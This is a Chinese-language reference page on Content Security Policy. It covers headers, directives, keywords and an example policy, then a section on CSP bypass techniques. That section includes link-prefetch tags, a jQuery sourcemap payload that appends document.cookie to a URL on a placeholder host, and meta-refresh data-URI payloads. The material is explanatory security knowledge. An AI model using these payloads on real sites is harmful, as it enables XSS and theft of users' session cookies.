CSP
================================

CSP是什么？
--------------------------------
Content Security Policy，简称 CSP。顾名思义，这个规范与内容安全有关，主要是用来定义页面可以加载哪些资源，减少 XSS 的发生。


配置
--------------------------------

CSP策略可以通过 HTTP 头信息或者 meta 元素定义。

CSP 有三类：

- Content-Security-Policy  (Google Chrome)
- X-Content-Security-Policy (Firefox)
- X-WebKit-CSP (WebKit-based browsers, e.g. Safari)

::

    HTTP header :
    "Content-Security-Policy:" 策略
    "Content-Security-Policy-Report-Only:" 策略


HTTP Content-Security-Policy 头可以指定一个或多个资源是安全的，而Content-Security-Policy-Report-Only则是允许服务器检查（非强制）一个策略。多个头的策略定义由优先采用最先定义的。

HTML Meta :
::

    <meta http-equiv="content-security-policy" content="策略">
    <meta http-equiv="content-security-policy-report-only" content="策略">


指令说明
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

============    ============
指令            说明     
============    ============
default-src     定义资源默认加载策略
connect-src     定义 Ajax、WebSocket 等加载策略
font-src        定义 Font 加载策略
frame-src       定义 Frame 加载策略
img-src         定义图片加载策略
media-src       定义 <audio>、<video> 等引用资源加载策略
object-src      定义 <applet>、<embed>、<object> 等引用资源加载策略
script-src      定义 JS 加载策略
style-src       定义 CSS 加载策略
sandbox         值为 allow-forms，对资源启用 sandbox
report-uri      值为 /report-uri，提交日志
============    ============

关键字
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

+--------------------+----------------------------+------------------------------------------------------------------+
| 属性值             | 示例                       | 说明                                                             |
+====================+============================+==================================================================+
| -                  | img-src -                  | 允许从任意url加载，除了data:blob:filesystem:schemes              |
+--------------------+----------------------------+------------------------------------------------------------------+
| 'none'             | object-src 'none'          | 禁止从任何url加载资源                                            |
+--------------------+----------------------------+------------------------------------------------------------------+
| 'self'             | img-src 'self'             | 只可以加载同源资源                                               |
+--------------------+----------------------------+------------------------------------------------------------------+
| data:              | img-src 'self' data:       | 可以通过data协议加载资源                                         |
+--------------------+----------------------------+------------------------------------------------------------------+
| domain.example.com | ing-src domain.example.com | 只可以从特定的域加载资源                                         |
+--------------------+----------------------------+------------------------------------------------------------------+
| \*.example.com     | img-src \*.example.com     | 可以从任意example.com的子域处加载资源                            |
+--------------------+----------------------------+------------------------------------------------------------------+
| https://cdn.com    | img-src https://cdn.com    | 只能从给定的域用https加载资源                                    |
+--------------------+----------------------------+------------------------------------------------------------------+
| https:             | img-src https:             | 只能从任意域用https加载资源                                      |
+--------------------+----------------------------+------------------------------------------------------------------+
| 'unsafe-inline'    | script-src 'unsafe-inline' | 允许内部资源执行代码例如style attribute,onclick或者是sicript标签 |
+--------------------+----------------------------+------------------------------------------------------------------+
| 'unsafe-eval'      | script-src 'unsafe-eval'   | 允许一些不安全的代码执行方式，例如js的eval()                     |
+--------------------+----------------------------+------------------------------------------------------------------+

- ``none``：你可能期望不匹配任何内容
- ``self``：与当前来源相同，但不包含子域
- ``unsafe-inline``：允许内联Javascript和CSS
- ``unsafe-eval``：允许文本到JS的机制例如eval

配置范例
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

允许执行内联 JS 代码，但不允许加载外部资源
::

    Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';


Bypass
--------------------------------

预加载
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
浏览器为了增强用户体验，让浏览器更有效率，就有一个预加载的功能，大体是利用浏览器空闲时间去加载指定的内容，然后缓存起来。这个技术又细分为DNS-prefetch、subresource、prefetch、preconnect、prerender。

HTML5页面预加载是用link标签的rel属性来指定的。如果csp头有unsafe-inline，则用预加载的方式可以向外界发出请求，例如

::

    <!-- 预加载某个页面 -->
    <link rel='prefetch' href='http://xxxx'><!-- firefox -->
    <link rel='prerender' href='http://xxxx'><!-- chrome -->
    <!-- 预加载某个图片 -->
    <link rel='prefetch' href='http://xxxx/x.jpg'>
    <!-- DNS 预解析 -->
    <link rel="dns-prefetch" href="http://xxxx">
    <!-- 特定文件类型预加载 -->
    <link rel='preload' href='//xxxxx/xx.js'><!-- chrome -->

另外，不是所有的页面都能够被预加载，当资源类型如下时，讲阻止预加载操作：

- URL中包含下载资源
- 页面中包含音频、视频
- POST、PUT和DELET操作的ajax请求
- HTTP认证
- HTTPS页面
- 含恶意软件的页面
- 弹窗页面
- 占用资源很多的页面
- 打开了chrome developer tools开发工具

MIME Sniff
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

举例来说，csp禁止跨站读取脚本，但是可以跨站读img，那么传一个含有脚本的img，再``<script href='http://xxx.com/xx.jpg'>``，这里csp认为是一个img，绕过了检查，如果网站没有回正确的mime type，浏览器会进行猜测，就可能加载该img作为脚本


302跳转
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

对于302跳转绕过CSP而言，实际上有以下几点限制：

- 跳板必须在允许的域内。
- 要加载的文件的host部分必须跟允许的域的host部分一致

其他
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

- CND Bypass,如果网站信任了某个CDN, 那么可利用相应的CDN bypass
- Angular versions <1.5.9 >=1.5.0，存在漏洞 `Git pr <https://github.com/angular/angular.js/pull/15346>`_
- jQuery sourcemap 
    ::

        document.write(`<script>
        //@        sourceMappingURL=http://xxxx/`+document.cookie+`<\/script>`);``
- a标签的ping属性
- For FireFox ``<META HTTP-EQUIV="refresh" CONTENT="0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=">``
- ``<link rel="import" />``
- ``<meta http-equiv="refresh" content="0; url=http://...." />``
